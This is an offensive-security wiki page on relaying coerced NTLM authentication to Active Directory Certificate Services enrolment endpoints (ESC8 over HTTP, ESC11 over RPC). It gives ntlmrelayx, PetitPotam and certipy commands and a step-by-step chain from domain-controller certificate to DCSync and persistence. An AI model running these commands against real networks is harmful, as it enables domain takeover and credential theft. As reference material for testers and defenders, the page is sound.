---
title: "Relay to AD CS: ESC8 and ESC11"
description: "Relaying coerced NTLM authentication to AD CS enrolment endpoints: the HTTP web-enrolment interface (ESC8) and the ICertPassage RPC interface (ESC11), obtaining a certificate for the relayed machine or user account."
keywords:
  - ESC8
  - ESC11
  - NTLM relay
  - web enrollment
  - ICertPassage
---

# Relay to AD CS

The CA's enrolment endpoints accept **NTLM authentication**, and by default do not enforce the protections that stop relay. So a [coerced](../ntlm/coercion.md) or captured authentication can be [relayed](../ntlm/relay.md) to the CA to obtain a certificate **as the victim**, most powerfully as a domain controller's machine account, which is then used to authenticate and DCSync.

## ESC8: HTTP web enrolment

The AD CS **web enrolment** interface (`http://<ca>/certsrv`) and the Certificate Enrollment Service accept NTLM and, unless Extended Protection for Authentication (EPA) is enforced, are relay targets:

```bash
# Relay coerced authentication to web enrolment, requesting a DC-auth certificate
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# In another terminal, coerce the DC to authenticate to the relay
petitpotam.py <relay-ip> <dc-ip>
# -> a certificate for DC$; authenticate and DCSync
certipy auth -pfx dc.pfx -dc-ip <dc>
```

Coerce over **HTTP** (via the WebClient service) where possible, since HTTP authentication is not covered by SMB signing and relays cleanly.

## ESC11: ICertPassage RPC

ESC11 is the same idea over the CA's **RPC** enrolment interface (ICertPassage / MS-ICPR). When the CA does not require packet privacy on that interface (`IF_ENFORCEENCRYPTICERTREQUEST` not set), a relayed authentication can request a certificate over RPC instead of HTTP:

```bash
# Relay to the CA RPC enrolment endpoint
ntlmrelayx.py -t rpc://<ca> -rpc-mode ICPR -icpr-ca-name <ca-name> --adcs --template Machine
```

This matters where the web-enrolment endpoint is absent or EPA-protected but the RPC interface is still unprotected.

## Exploitation notes

- The canonical unauthenticated-to-domain chain is **coerce a DC over HTTP -> relay to ESC8 -> DC certificate -> authenticate as DC$ -> DCSync**; it needs no credential if coercion is reachable unauthenticated.
- Request a certificate with the **DomainController** (or Machine) template when relaying a machine account, and a user template when relaying a user.
- A certificate obtained this way is long-lived and survives a password reset of the victim, so it also serves as persistence.
- These are AD CS specializations of general [NTLM relay](../ntlm/relay.md); the same signing/EPA rules decide feasibility.

## Tools

- **ntlmrelayx.py** (`--adcs`, `-rpc-mode ICPR`): relay to web and RPC enrolment.
- **Coercer / PetitPotam / printerbug.py**: source the authentication.
- **Certipy** (`auth`, `relay`): request via relay and authenticate with the result.

## References

- SpecterOps: Certified Pre-Owned (ESC8)
- The Hacker Recipes: AD CS relay (ESC8, ESC11)
